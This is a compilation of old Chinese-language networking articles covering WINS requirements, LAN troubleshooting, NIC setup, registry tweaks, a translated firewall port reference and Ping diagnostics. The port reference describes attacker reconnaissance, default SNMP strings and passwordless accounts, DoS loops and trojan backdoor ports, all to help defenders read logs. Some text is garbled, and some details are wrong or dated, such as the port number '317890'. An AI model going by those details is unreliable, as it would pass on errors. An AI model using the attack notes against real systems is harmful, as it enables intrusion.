三.WINS服务器和客户端的需求 
1.Microsoft对服务器的需求 
（1）.至少提供一个首选WINS服务器和一个次选WINS服务器来提供容错功能。 
（2）.一个WINS服务器每分钟可以处理近1500个名字注册和约4500个名字查询。因此我们强烈建议你一个首选和一个次选WINS服务器可以带动10000个客户端。 
（3）.如果WINS服务器与客户机不在同一个子网上，就要考虑到路由器的性能了。 
2.客户端的需求 
几乎所有的支持网络互联的Microsoft客户端都可以是WINS客户端，下面列出了可以与WINS一起工作的客户端： 
*Windows NT Server 3.5x,4.0 
*Windows NT Workstation 3.5x,4.0 
*Windows 9x/me/2000 
*Windows for Workgroups with TCP/IP-32 
*Microsoft Network Client 3.0 for MS-DOS 
*LAN Manager 2.2c for MS-DOS 
基于DOS的客户端也可以用WINS服务器进行名字解析，但你必须为它们在WINS服务器中添加静态词条。


局域网常见故障十五问
1、为什么Windows 98网上邻居中找不到域及服务器，但可找到其他的工作站? 
解答： 
在"控制面板→网络→Microsoft网络客户"中，将登录时Windows 98与网络的连接由慢 
速改为快速连接。 
2、为什么在查看"网上邻居"时，会出现 "无法浏览网络。网络不可访问。想得到更多 
信息，请查看'帮助索引'中的'网络疑难解答'专题。"的错误提示? 
解答： 
（1）在Windows启动后，要求输入Microsoft网络用户登录口令时，点了"取消"按钮所 
造成的，如果是要登录NT服务器，必须以合法的用户登录，并且输入正确口令。 
（2）与其它的硬件起冲突。打开"控制面板→系统→设备管理"。查看硬件的前面是否 
有黄色的问号、感叹号或者红色的问号。如果有，必须手工更改这些设备的中断和I/O 
地址设置。 
3、为什么在"网上邻居"或"资源管理器"中只能找到本机的机器名? 
解答： 
网络通信错误，一般是网线断路或者与网卡的接确不良，还有可能是Hub有问题。 
4、为什么可以访问服务器，也可以访问Internet，但却无法访问其他工作站? 
解答： 
（1）如果使用了WINS解析，可能是WINS服务器地址设置不当。 
（2）检查网关设置，若双方分属不同的子网而网关设置有误，则不能看到其他工作 
站。 
（3）检查子网掩码设置。 
5、为什么网卡安装不上？ 
解答： 
（1）计算机上安装了过多其它类型的接口卡，造成中断和I/O地址冲突。可以先将其他 
不重要的卡拿下来，再安装网卡，最后再安装其他接口卡。 
（2）计算机中有一些安装不正确的设备，或有"未知设备"一项，使系统不能检测网 
卡。这时应该删除"未知设备"中的所有项目，然后重新启动计算机。 
（3）计算机不能识别这一种类型的网卡，一般只能更换网卡。 
6、为什么可以Ping通IP地址，但Ping不通域名? 
解答： 
TCP/IP协议中的"DNS设置"不正确，请检查其中的配置。对于对等网，"主机"应该填自 
己机器本身的名字，"域"不需填写，DNS服务器应该填自己的IP。对于服务器/工作站 
网，"主机"应该填服务器的名字，"域"填局域网服务器设置的域，DNS服务器应该填服 
务器的IP。 
7、为什么网络上的其他计算机无法与我的计算机连接？ 
解答： 
（1）确认是否安装了该网络使用的网络协议？如果要登录NT域，还必须安装NetBEUI协 
议。 
（2）是否安装并启用了文件和打印共享服务？ 
（3）如果是要登录NT服务器网络，在"网络"属性的"主网络登录"中，应该选择 
"Microsoft网络用户"。 
（4）如果是要登录NT服务器网络，在"网络"属性框的"配置"选项卡中，双击列表中的 
"Microsoft网络用户"组件，检查是否已选中"登录到Windows域"复选框，以及"Windows 
域"下的域名是否正确。 
8、为什么安装网卡后，计算机启动的速度慢了很多？ 
解答： 
可能在TCP/IP设置中设置了"自动获取IP地址"，这样每次启动计算机时，计算机都会主 
动搜索当前网络中的DHCP服务器，所以计算机启动的速度会大大降低。 
解决的方法是"指定IP地址"。 
9、为什么在网络邻居中看不到任何计算机? 
解答： 
主要原因可能是网卡的驱动程序工作不正常。请检查网卡的驱动程序，必要时重新安装 
驱动程序。 
10、为什么能够看到别人的机器，但不能读取别人电脑上的数据？ 
解答： 
（1）首先必须设置好资源共享。选择"网络→配置→文件及打印共享"，将两个选项全 
部打勾并确定，安装成功后在"配置"中会出现"Microsoft 网络上的文件与打印机共享" 
选项。 
（2）检查所安装的所有协议中，是否绑定了"Microsoft网络上的文件与打印机共享"。 
选择"配置"中的协议如"TCP/IP协议"，点击"属性"按钮，确保绑定中"Microsoft网络上 
的文件与打印机共享"、"Microsoft网络用户"前已经打勾了。 
11、为什么在安装网卡后通过"控制面板→系统→设备管理器"查看时，报告"可能没有 
该设备，也可能此设备未正常运行，或是没有安装此设备的所有驱动程序"的错误信息? 
解答： 
（1）没有安装正确的驱动程序，或者驱动程序版本不对。 
（2）中断号与I/O地址没有设置好。有一些网卡通过跳线开关设置；另外一些是通过随 
卡带的软盘中的Setup程序进行设置。 
12、为什么已经安装了网卡和各种网络通讯协议，但"文件及打印共享"是虚的，无法选 
择？ 
解答： 
原因是没有安装"Microsoft 网络上的文件与打印共享"组件。在"网络"属性窗口的"配 
置"标签里，单击"添加"按钮，在"请选择网络组件"窗口单击"服务"，单击"添加"按 
钮，在"选择网络服务"的左边窗口选择"Microsoft"，在右边窗口选择"Microsoft网络 
上的文件与打印机共享"，单击"确定"按钮，系统可能会要求插入Windows安装光盘，重 
新启动系统即可。 
13、为什么无法在网络上共享文件和打印机？ 
解答： 
（1）确认是否安装了文件和打印机共享服务组件。要共享本机上的文件或打印机，必 
须安装"Microsoft网络上的文件与打印机共享"服务。 
（2）确认是否已经启用了文件或打印机共享服务。在"网络"属性框中选择"配置"选项 
卡，单击"文件与打印机共享"按钮，然后选择"允许其他用户访问的我的文件"和"允许 
其他计算机使用我的打印机"选项。 
（3）确认访问服务是共享级访问服务。在"网络"属性的"访问控制"里面应该选择"共享 
级访问"。 
14、为什么无法登录到网络上？ 
解答： 
（1）检查计算机上是否安装了网络适配器，该网络适配器工作是否正常。 
（2）确保网络通信正常，即网线等连接设备完好。 
（3）确认网络适配器的中断和I/O地址没有与其他硬件冲突。 
（4）网络设置可能有问题。 
15、为什么无法将台式电脑与笔记本电脑使用直接电缆连接？ 
解答： 
笔记本电脑自身可能带有PCMCIA网卡，在"我的电脑→控制面板→系统→设备管理器"中 
删除该"网络适配器"记录后，重新连接即可。
网卡的安装与维护
----在网络环境中，网卡是上网操作的第一道关口，若网卡出现设置冲突或硬件故障，上网过程中计算机会提示拒绝登录信息，上网操作只能成为一句空话。笔者在对网络的维护中总结了这样一些体会： 
1.正确设置网卡 
<图片>----一般局域性网络大多采用共享式以太网，使用的网卡多为16位，采用客户（工作站）/服务器体系结构。系统网络中服务器数量及每台服务器所插网卡数量视网络结构及工作站数量、分布情况而定（一般一台服务器可插1～4块网卡），故在安装调试时就涉及到网卡设置问题。若这些网卡设置不当，则信息无法实现共享，网络系统无法正常运行。笔者认为网卡设置要恪守以下原则：（1）同一台服务器上几块网卡的中断请求线（IRQ）、基本I/O地址（I/OBASE）以及电缆连接系统网络号（NET）应各不相同（其中IRQ、I/OBASE为随卡出厂设置，如TE-200016位网卡的IRQ=3、I/OBASE=300H。若系统网络只有一台服务器，则NET可不设置）。若想把几块网卡安装在同一台服务器上，则要在该服务器上对上述参数进行设置。假如欲将3块网卡安装在服务器1上，如果第一块网卡IRQ设为3，那第二块则要设为除3以外的其他数，即数值不能相同，以此类推。（2）同一网络系统几台服务器实现数据共享，其不同服务器上网卡设置参数（IRQ、I/OBASE、NET）可以相同也可以不同，但几台服务器之间的互联线对应的那几块网卡的NET参数设置必须相同。例如一个网络系统有3台服务器，要求工作站可以分别访问这3台服务器，服务器1上其中一块网卡的3个设置分别是IRQ=3、I/OBASE=300H、NET=13，服务器2或服务器3的其中一块网卡设置可以和服务器1的那块网卡设置完全相同，但服务器1与服务器2和服务器3之间的网络连线对应的那3块网卡的NET参数必须相同，比如NET均为26，即只有电缆连接系统网络号相同，网络才能实现互访。基于上述两点，建议网络维护人员在安装调试过程中做好网卡的管理登记工作，切实做到服务器上不同型号网卡的安装软件、在线设置的相关数据有案可查、对号入座，尤以较大规模的网络为甚。这样在网络维护过程中，无论网卡出现硬故障或软故障，都可以通过网络提供的信息与登记记录进行对照，快捷清晰地判断问题出在哪里，进而排除，以确保系统的安全可靠。 2.科学合理地使用网卡 
----（1）一般网卡有BNCT型接头、水晶头两种插口形式。与水晶头相连的双绞线（RT-45）为8芯制。而实际上一条双绞线传输网线只使用其中的4芯，其余4芯为闲置。有效的4芯线分别安装在水晶头1、2、3、6插槽内（水晶头水平放置，插入网卡端面对读者，固定卡朝下，插槽自右向左依次为1、2、3…7、8）。这样若一根双绞线传输有故障时，只检查有效的4芯即可。同时这样一根双绞线（8芯制）就可以作为两条网络线使用，即可以同时连接两个工作站（若两台工作站相隔较近且对网络干扰要求不高）。这样一来既提高了工作效率又节省了材料。 
----（2）同轴电缆（RG58A/U）作为传输媒体，在网络系统中亦较常见。它大多用于服务器与集线器（HUB）、服务器与工作站之间的连线，其优点是频带较宽，数据传输不易受干扰。但是如果网络一端不接地或接地不良，运行过程中遇到雷暴天气，大气中产生雷电过电压，进而产生雷电流，该电流通过同轴电缆传入网卡及集线器中（此电流为网卡及集线器工作电流的几十倍），极有可能将相关元器件击穿，中断网络传输。我们通过实践深深体会到欲使网络运行更安全，网络系统可靠接地至关重要。具体实施如下：对于一个网络系统必须有自己独立的接地系统，其接地极与接地线的安装铺设和接地电阻的测量要严格按照电工技术安装部颁标准实施。网络系统每条用终结器连接的网络回路两端都必须可靠接地（即把用同轴电缆联接的每条回路其中一端终结器外壳用一根铜芯线焊接到接地线上），切不可掉以轻心，否则后患无穷。这样当网线遭雷击时其电流通过同轴电缆屏蔽网与接地装置流入大地，杜绝和减少网络设备遭受雷击而损坏的可能性。 ----一般入网操作中，若电脑提示“Anetworkservercouldnotbefound”大多是网络硬件（网卡、集线器或网线）故障，在排除软件故障可能性后，极有可能是由于网卡及集线器BNCT型接头插口内通讯接口集成块（D-Link卡MTD492N、NE(TE)-2000卡UM9092A、八端口HUBDP8392CN）或通讯接口集成块的外围元器件击穿或损坏所致。简捷的判断方法是，取下同轴电缆，用双绞线作传输媒体，若重新上网登录成功，则证明是上述故障所致。拆下该网卡或集线器检查出相应的损坏元件，花几元钱买回更换，即可起死回生，这仅仅是下策。上策是将您的网络系统每条同轴电缆回路可靠接地，基本可以杜绝这方面的损坏。既保证了网络的安全可靠又节省了开支，可谓一劳永逸。
修改注册表大全
对于如何通过修改注册表来改动系统设置已有很多介绍，今天我也来凑个热闹，列出几个不常见的设置方法： 
  一，改变一般图标大小(像素)：更改[HKEY－CURRENT－USER\Control Panel\desktop\WindowMetrics] ，令Shell Icon Size=″32″即可。 
　　二， 改变小图标大小(像素)：在[HKEY－CURRENT－USER\Control Panel\desktop\WindowMetrics]中，更改或新建Shell Small Icon Size=″16″即可。 
　　三， 禁止系统右键弹出菜单：在[HKEY－CURRENT－USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer]中，建立键值NoViewContextMenu= 01 00 00 00。 
　　四， 禁止任务栏右键弹出菜单 ：在[HKEY－CURRENT－USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer]中，新建NoTrayContextMenu=01 00 00 00。 
　　五，隐藏[设置]菜单中[控制面板]和[打印机]菜单项：在[HKEY－CURRENT－USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer]中，新建键值NoSetFolders=01 00 00 00。 
　　六， 隐藏[设置]菜单中[任务栏和开始菜单]菜单项：在[HKEY－CURRENT－USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer]中，新建键值NoChangeStartMenu=01 00 00 00，NoSetTaskbar=01 00 00 00。 
　　七， 隐藏[设置]菜单中[文件夹选项...]：在[HKEY－CURRENT－USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer]中，新建NoFolderOptions=01 00 00 00。 
　　八， 隐藏[设置]菜单中[活动桌面]项：在[HKEY－CURRENT－USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer]中，新建NoSetActiveDesktop=01 00 00 00。 
　　九， 隐藏[设置]菜单中[Windows Update]项：在[HKEY－CURRENT－USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer]中，新建NoWindowsUpdate=01 00 00 00。 
　　十， 禁止“文档”记录功能：在[HKEY－CURRENT－USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer]中，新建NoRecentDocsHistory=01 00 00 00。 
　　十一， 退出时自动清除文档内容：在[HKEY－CURRENT－USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer]中，新建ClearRecentDocsonExit= 01 00 00 00。 
　　十二， 禁止数据光盘自动运行：在[HKEY－CURRENT－USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer]中，新建NoDriveTypeAutoRun=00 00 00 00。 
　　十三， 禁止CD光盘自动运行：在[HKEY－CLASSES－ROOT\AudioCD\shell]中，新建键值@=″ ″ 
　　十四， 去除新建快捷方式时自动添加的“快捷方式”字符串：在[HKEY－CURRENT－USER\Software\Microsoft\Windows\CurrentVersion\Explorer]中，令Link=00 00 00 00。 
　　十五， 禁止使用MS－DOS方式：在[HKEY－CURRENT－USER\Software\Microsoft\Windows\CurrentVersion\Policies\WinOldApp]中，建立键值Disabled=01 00 00 00。 
　　十六， 关闭“无反应的应用程序”的等待时间(毫秒)：在[HKEY－CURRENT－USER\Control Panel\desktop]中，新建WaitToKillAppTimeOut=″10000″ 
　　十七， 关闭出错应用程序的等待响应时间(毫秒)：在[HKEY－CURRENT－USER\Control Panel\desktop]中，新建HungAppTimeout=″10000″。 
电脑端口基础知识
端口可分为3大类： 
1） 公认端口（Well Known Ports）：从0到1023，它们紧密绑定于一些服务。通常这些端口的通讯明确表明了某种服务的协议。例如：80端口实际上总是HTTP通讯。 
2） 注册端口（Registered Ports）：从1024到49151。它们松散地绑定于一些服务。也就是说有许多服务绑定于这些端口，这些端口同样用于许多其它目的。例如：许多系统处理动态端口从1024左右开始。 
3） 动态和/或私有端口（Dynamic and/or Private Ports）：从49152到65535。理论上，不应为服务分配这些端口。实际上，机器通常从1024起分配动态端口。但也有例外：SUN的RPC端口从32768开始。 
　　本节讲述通常TCP/UDP端口扫描在防火墙记录中的信息。记住：并不存在所谓ICMP端口。如果你对解读ICMP数据感兴趣，请参看本文的其它部分。 
　　0 通常用于分析操作系统。这一方法能够工作是因为在一些系统中“0”是无效端口，当你试图使用一种通常的闭合端口连接它时将产生不同的结果。一种典型的扫描：使用IP地址为0.0.0.0，设置ACK位并在以太网层广播。 
　　1 tcpmux 这显示有人在寻找SGI Irix机器。Irix是实现tcpmux的主要提供者，缺省情况下tcpmux在这种系统中被打开。Iris机器在发布时含有几个缺省的无密码的帐户，如lp, guest, uucp, nuucp, demos, tutor, diag, EZsetup, OutOfBox, 和4Dgifts。许多管理员安装后忘记删除这些帐户。因此Hacker们在Internet上搜索tcpmux并利用这些帐户。 
　　7 Echo 你能看到许多人们搜索Fraggle放大器时，发送到x.x.x.0和x.x.x.255的信息。 
　　常见的一种DoS攻击是echo循环（echo-loop），攻击者伪造从一个机器发送到另一个机器的UDP数据包，而两个机器分别以它们最快的方式回应这些数据包。（参见Chargen） 
　　另一种东西是由DoubleClick在词端口建立的TCP连接。有一种产品叫做“Resonate Global Dispatch”，它与DNS的这一端口连接以确定最近的路由。 
　　Harvest/squid cache将从3130端口发送UDP echo：“如果将cache的source_ping on选项打开，它将对原始主机的UDP echo端口回应一个HIT reply。”这将会产生许多这类数据包。 
　　11 sysstat 这是一种UNIX服务，它会列出机器上所有正在运行的进程以及是什么启动了这些进程。这为入侵者提供了许多信息而威胁机器的安全，如暴露已知某些弱点或帐户的程序。这与UNIX系统中“ps”命令的结果相似 
　　再说一遍：ICMP没有端口，ICMP port 11通常是ICMP type=11 
　　19 chargen 这是一种仅仅发送字符的服务。UDP版本将会在收到UDP包后回应含有垃圾字符的包。TCP连接时，会发送含有垃圾字符的数据流知道连接关闭。Hacker利用IP欺骗可以发动DoS攻击。伪造两个chargen服务器之间的UDP包。由于服务器企图回应两个服务器之间的无限的往返数据通讯一个chargen和echo将导致服务器过载。同样fraggle DoS攻击向目标地址的这个端口广播一个带有伪造受害者IP的数据包，受害者为了回应这些数据而过载。 
　　21 ftp 最常见的攻击者用于寻找打开“anonymous”的ftp服务器的方法。这些服务器带有可读写的目录。Hackers或Crackers 利用这些服务器作为传送warez (私有程序) 和pr0n(故意拼错词而避免被搜索引擎分类)的节点。 
　　22 ssh PcAnywhere建立TCP和这一端口的连接可能是为了寻找ssh。这一服务有许多弱点。如果配置成特定的模式，许多使用RSAREF库的版本有不少漏洞。（建议在其它端口运行ssh） 
　　还应该注意的是ssh工具包带有一个称为make-ssh-known-hosts的程序。它会扫描整个域的ssh主机。你有时会被使用这一程序的人无意中扫描到。 
　　UDP（而不是TCP）与另一端的5632端口相连意味着存在搜索pcAnywhere的扫描。5632（十六进制的0x1600）位交换后是0x0016（使进制的22）。 
　　23 Telnet 入侵者在搜索远程登陆UNIX的服务。大多数情况下入侵者扫描这一端口是为了找到机器运行的操作系统。此外使用其它技术，入侵者会找到密码。 
　　25 smtp 攻击者（spammer）寻找SMTP服务器是为了传递他们的spam。入侵者的帐户总被关闭，他们需要拨号连接到高带宽的e-mail服务器上，将简单的信息传递到不同的地址。SMTP服务器（尤其是sendmail）是进入系统的最常用方法之一，因为它们必须完整的暴露于Internet且邮件的路由是复杂的（暴露+复杂=弱点）。 
　　53 DNS Hacker或crackers可能是试图进行区域传递（TCP），欺骗DNS（UDP）或隐藏其它通讯。因此防火墙常常过滤或记录53端口。 
　　需要注意的是你常会看到53端口做为UDP源端口。不稳定的防火墙通常允许这种通讯并假设这是对DNS查询的回复。Hacker常使用这种方法穿透防火墙。 
　　67和68 Bootp和DHCP UDP上的Bootp/DHCP：通过DSL和cable-modem的防火墙常会看见大量发送到广播地址255.255.255.255的数据。这些机器在向DHCP服务器请求一个地址分配。Hacker常进入它们分配一个地址把自己作为局部路由器而发起大量的“中间人”（man-in-middle）攻击。客户端向68端口（bootps）广播请求配置，服务器向67端口（bootpc）广播回应请求。这种回应使用广播是因为客户端还不知道可以发送的IP地址。 
　　69 TFTP(UDP) 许多服务器与bootp一起提供这项服务，便于从系统下载启动代码。但是它们常常错误配置而从系统提供任何文件，如密码文件。它们也可用于向系统写入文件。 
　　79 finger Hacker用于获得用户信息，查询操作系统，探测已知的缓冲区溢出错误，回应从自己机器到其它机器finger扫描。 
　　98 linuxconf 这个程序提供linux boxen的简单管理。通过整合的HTTP服务器在98端口提供基于Web界面的服务。它已发现有许多安全问题。一些版本setuid root，信任局域网，在/tmp下建立Internet可访问的文件，LANG环境变量有缓冲区溢出。此外因为它包含整合的服务器，许多典型的HTTP漏洞可能存在（缓冲区溢出，历遍目录等） 
　　109 POP2 并不象POP3那样有名，但许多服务器同时提供两种服务（向后兼容）。在同一个服务器上POP3的漏洞在POP2中同样存在。 
　　110 POP3 用于客户端访问服务器端的邮件服务。POP3服务有许多公认的弱点。关于用户名和密码交换缓冲区溢出的弱点至少有20个（这意味着Hacker可以在真正登陆前进入系统）。成功登陆后还有其它缓冲区溢出错误。 
　　111 sunrpc portmap rpcbind Sun RPC PortMapper/RPCBIND。访问portmapper是扫描系统查看允许哪些RPC服务的最早的一步。常见RPC服务有：rpc.mountd, NFS, rpc.statd, rpc.csmd, rpc.ttybd, amd等。入侵者发现了允许的RPC服务将转向提供服务的特定端口测试漏洞。 
　　记住一定要记录线路中的daemon, IDS, 或sniffer，你可以发现入侵者正使用什么程序访问以便发现到底发生了什么。 
　　113 Ident auth 这是一个许多机器上运行的协议，用于鉴别TCP连接的用户。使用标准的这种服务可以获得许多机器的信息（会被Hacker利用）。但是它可作为许多服务的记录器，尤其是FTP, POP, IMAP, SMTP和IRC等服务。通常如果有许多客户通过防火墙访问这些服务，你将会看到许多这个端口的连接请求。记住，如果你阻断这个端口客户端会感觉到在防火墙另一边与e-mail服务器的缓慢连接。许多防火墙支持在TCP连接的阻断过程中发回RST，着将回停止这一缓慢的连接。 
　　119 NNTP news 新闻组传输协议，承载USENET通讯。当你链接到诸如：news://comp.security.firewalls/. 的地址时通常使用这个端口。这个端口的连接企图通常是人们在寻找USENET服务器。多数ISP限制只有他们的客户才能访问他们的新闻组服务器。打开新闻组服务器将允许发/读任何人的帖子，访问被限制的新闻组服务器，匿名发帖或发送spam。 
　　135 oc-serv MS RPC end-point mapper Microsoft在这个端口运行DCE RPC end-point mapper为它的DCOM服务。这与UNIX 111端口的功能很相似。使用DCOM和/或RPC的服务利用机器上的end-point mapper注册它们的位置。远端客户连接到机器时，它们查询end-point mapper找到服务的位置。同样Hacker扫描机器的这个端口是为了找到诸如：这个机器上运行Exchange Server吗？是什么版本？ 
　　这个端口除了被用来查询服务（如使用epdump）还可以被用于直接攻击。有一些DoS攻击直接针对这个端口。 
　　137 NetBIOS name service nbtstat (UDP) 这是防火墙管理员最常见的信息，请仔细阅读文章后面的NetBIOS一节 
　　139 NetBIOS　File and Print Sharing 通过这个端口进入的连接试图获得NetBIOS/SMB服务。这个协议被用于Windows“文件和打印机共享”和SAMBA。在Internet上共享自己的硬盘是可能是最常见的问题。 
　　大量针对这一端口始于1999，后来逐渐变少。2000年又有回升。一些VBS（IE5 VisualBasic Scripting）开始将它们自己拷贝到这个端口，试图在这个端口繁殖。 
　　143 IMAP 和上面POP3的安全问题一样，许多IMAP服务器有缓冲区溢出漏洞运行登陆过程中进入。记住：一种Linux蠕虫（admw0rm）会通过这个端口繁殖，因此许多这个端口的扫描来自不知情的已被感染的用户。当RadHat在他们的Linux发布版本中默认允许IMAP后，这些漏洞变得流行起来。Morris蠕虫以后这还是第一次广泛传播的蠕虫。 
　　这一端口还被用于IMAP2，但并不流行。 
　　已有一些报道发现有些0到143端口的攻击源于脚本。 
　　161 SNMP(UDP) 入侵者常探测的端口。SNMP允许远程管理设备。所有配置和运行信息都储存在数据库中，通过SNMP客获得这些信息。许多管理员错误配置将它们暴露于Internet。Crackers将试图使用缺省的密码“public”“private”访问系统。他们可能会试验所有可能的组合。 
　　SNMP包可能会被错误的指向你的网络。Windows机器常会因为错误配置将HP JetDirect remote management软件使用SNMP。HP OBJECT IDENTIFIER将收到SNMP包。新版的Win98使用SNMP解析域名，你会看见这种包在子网内广播（cable modem, DSL）查询sysName和其它信息。 
　　162 SNMP trap 可能是由于错误配置 
　　177 xdmcp 许多Hacker通过它访问X-Windows控制台，它同时需要打开6000端口。 
　　513 rwho 可能是从使用cable modem或DSL登陆到的子网中的UNIX机器发出的广播。这些人为Hacker进入他们的系统提供了很有趣的信息。 
　　553 CORBA IIOP (UDP) 如果你使用cable modem或DSL VLAN，你将会看到这个端口的广播。CORBA是一种面向对象的RPC（remote procedure call）系统。Hacker会利用这些信息进入系统。 
　　600 Pcserver backdoor 请查看1524端口 
　　一些玩script的孩子认为他们通过修改ingreslock和pcserver文件已经完全攻破了系统-- Alan J. Rosenthal. 
　　635 mountd Linux的mountd Bug。这是人们扫描的一个流行的Bug。大多数对这个端口的扫描是基于UDP的，但基于TCP的mountd有所增加（mountd同时运行于两个端口）。记住，mountd可运行于任何端口（到底在哪个端口，需要在端口111做portmap查询），只是Linux默认为635端口，就象NFS通常运行于2049端口。 
　　1024 许多人问这个端口是干什么的。它是动态端口的开始。许多程序并不在乎用哪个端口连接网络，它们请求操作系统为它们分配“下一个闲置端口”。基于这一点分配从端口1024开始。这意味着第一个向系统请求分配动态端口的程序将被分配端口1024。为了验证这一点，你可以重启机器，打开Telnet，再打开一个窗口运行“natstat -a”，你将会看到Telnet被分配1024端口。请求的程序越多，动态端口也越多。操作系统分配的端口将逐渐变大。再来一遍，当你浏览Web页时用“netstat”查看，每个Web页需要一个新端口。 
　?ersion 0.4.1, June 20, 2000 
　　http://www.robertgraham.com/pubs/firewall-seen.html 
　　Copyright 1998-2000 by Robert Graham (mailto:firewall-seen1@robertgraham.com. 
　　All rights reserved. This document may only be reproduced (whole or 
in part) for non-commercial purposes. All reproductions must 
contain this copyright notice and must not be altered, except by 
permission of the author. 
　　1025 参见1024 
　　1026 参见1024 
　　1080 SOCKS 
　　这一协议以管道方式穿过防火墙，允许防火墙后面的许多人通过一个IP地址访问Internet。理论上它应该只允许内部的通信向外达到Internet。但是由于错误的配置，它会允许Hacker/Cracker的位于防火墙外部的攻击穿过防火墙。或者简单地回应位于Internet上的计算机，从而掩饰他们对你的直接攻击。WinGate是一种常见的Windows个人防火墙，常会发生上述的错误配置。在加入IRC聊天室时常会看到这种情况。 
　　1114 SQL 
　　系统本身很少扫描这个端口，但常常是sscan脚本的一部分。 
　　1243 Sub-7木马（TCP） 
　　参见Subseven部分。 
　　1524 ingreslock后门 
　　许多攻击脚本将安装一个后门Sh*ll 于这个端口（尤其是那些针对Sun系统中Sendmail和RPC服务漏洞的脚本，如statd, ttdbserver和cmsd）。如果你刚刚安装了你的防火墙就看到在这个端口上的连接企图，很可能是上述原因。你可以试试Telnet到你的机器上的这个端口，看看它是否会给你一个Sh*ll 。连接到600/pcserver也存在这个问题。 
　　2049 NFS 
　　NFS程序常运行于这个端口。通常需要访问portmapper查询这个服务运行于哪个端口，但是大部分情况是安装后NFS 杏谡飧龆丝冢?acker/Cracker因而可以闭开portmapper直接测试这个端口。 
　　3128 squid 
　　这是Squid HTTP代理服务器的默认端口。攻击者扫描这个端口是为了搜寻一个代理服务器而匿名访问Internet。你也会看到搜索其它代理服务器的端口：8000/8001/8080/8888。扫描这一端口的另一原因是：用户正在进入聊天室。其它用户（或服务器本身）Q9750406也会检验这个端口以确定用户的机器是否支持代理。请查看5.3节。 
　　5632 pcAnywere 
　　你会看到很多这个端口的扫描，这依赖于你所在的位置。当用户打开pcAnywere时，它会自动扫描局域网C类网以寻找可能得代理（译者：指agent而不是proxy）。Hacker/cracker也会寻找开放这种服务的机器，所以应该查看这种扫描的源地址。一些搜寻pcAnywere的扫描常包含端口22的UDP数据包。参见拨号扫描。 
　　6776 Sub-7 artifact 
　　这个端口是从Sub-7主端口分离出来的用于传送数据的端口。例如当控制者通过电话线控制另一台机器，而被控机器挂断时你将会看到这种情况。因此当另一人以此IP拨入时，他们将会看到持续的，在这个端口的连接企图。（译者：即看到防火墙报告这一端口的连接企图时，并不表示你已被Sub-7控制。） 
　　6970 RealAudio 
　　RealAudio客户将从服务器的6970-7170的UDP端口接收音频数据流。这是由TCP7070端口外向控制连接设置的。 
　　13223 PowWow 
　　PowWow 是Tribal Voice的聊天程序。它允许用户在此端口打开私人聊天的连接。这一程序对于建立连接非常具有“进攻性”。它会“驻扎”在这一TCP端口等待回应。这造成类似心跳间隔的连接企图。如果你是一个拨号用户，从另一个聊天者手中“继承”了IP地址这种情况就会发生：好象很多不同的人在测试这一端口。这一协议使用“OPNG”作为其连接企图的前四个字节。 
　　17027 Conducent 
　　这是一个外向连接。这是由于公司内部有人安装了带有Conducent "adbot" 的共享软件。Conducent "adbot"是为共享软件显示广告服务的。使用这种服务的一种流行的软件是Pkware。有人试验：阻断这一外向连接不会有任何问题，但是封掉IP地址本身将会导致adbots持续在每秒内试图连接多次而导致连接过载： 
机器会不断试图解析DNS名─ads.conducent.com，即IP地址216.33.210.40 ；216.33.199.77 ；216.33.199.80 ；216.33.199.81；216.33.210.41。（译者：不知NetAnts使用的Radiate是否也有这种现象） 
　　27374 Sub-7木马(TCP) 
　　参见Subseven部分。 
　　30100 NetSphere木马(TCP) 
　　通常这一端口的扫描是为了寻找中了NetSphere木马。 
　　31337 Back Orifice “elite” 
　　Hacker中31337读做“elite”/ei’li:t/（译者：法语，译为中坚力量，精华。即3=E, 1=L, 7=T）。因此许多后门程序运行于这一端口。其中最有名的是Back Orifice。曾经一段时间内这是Internet上最常见的扫描。现在它的流行越来越少，其它的木马程序越来越流行。 
　　31789 Hack-a-tack 
　　这一端口的UDP通讯通常是由于"Hack-a-tack"远程访问木马（RAT, Remote Access Trojan）。这种木马包含内置的31790端口扫描器，因此任何31789端口到317890端口的连接意味着已经有这种入侵。（31789端口是控制连接，317890端口是文件传输连接） 
　　32770~32900 RPC服务 
　　Sun Solaris的RPC服务在这一范围内。详细的说：早期版本的Solaris（2.5.1之前）将portmapper置于这一范围内，即使低端口被防火墙封闭仍然允许Hacker/cracker访问这一端口。扫描这一范围内的端口不是为了寻找portmapper，就是为了寻找可被攻击的已知的RPC服务。 
　　33434~33600 traceroute 
　　如果你看到这一端口范围内的UDP数据包（且只在此范围之内）则可能是由于traceroute。参见traceroute部分。 
　　41508 Inoculan 
　　早期版本的Inoculan会在子网内产生大量的UDP通讯用于识别彼此。参见 
　　http://www.circlemud.org/~jelson/software/udpsend.html 
　　http://www.ccd.bnl.gov/nss/tips/inoculan/index.html 
(二） 下面的这些源端口意味着什么？ 
　　端口1~1024是保留端口，所以它们几乎不会是源端口。但有一些例外，例如来自NAT机器的连接。参见1.9。 
　　常看见紧接着1024的端口，它们是系统分配给那些并不在乎使用哪个端口连接的应用程序的“动态端口”。 
Server Client 服务 描述 
　　1-5/tcp 动态 FTP 1-5端口意味着sscan脚本 
　　20/tcp 动态 FTP FTP服务器传送文件的端口 
　　53 动态 FTP DNS从这个端口发送UDP回应。你也可能看见源/目标端口的TCP连接。 
　　123 动态 S/NTP 简单网络时间协议（S/NTP）服务器运行的端口。它们也会发送到这个端口的广播。 
　　27910~27961/udp 动态 Quake Quake或Quake引擎驱动的游戏在这一端口运行其服务器。因此来自这一端口范围的UDP包或发送至这一端口范围的UDP包通常是游戏。 
　　61000以上 动态 FTP 61000以上的端口可能来自Linux NAT服务器（IP Masquerade）  
Anndoo 
使用Ping命令判断TCP/IP网络故障
1.Ping 127.0.0.1 
  127.0.0.1是本地的循环地址，Ping通则说明TCP/IP协议工作正常，否则TCP/IP就不正常。 
2.Ping本机的IP地址 
  使用IPCONFIG命令可查看本机的IP地址，Ping IP地址，若Ping通，说明网络适配器（网卡或MODEM）工作正常，否则就不正常。 
3.Ping同网段计算机IP地址 
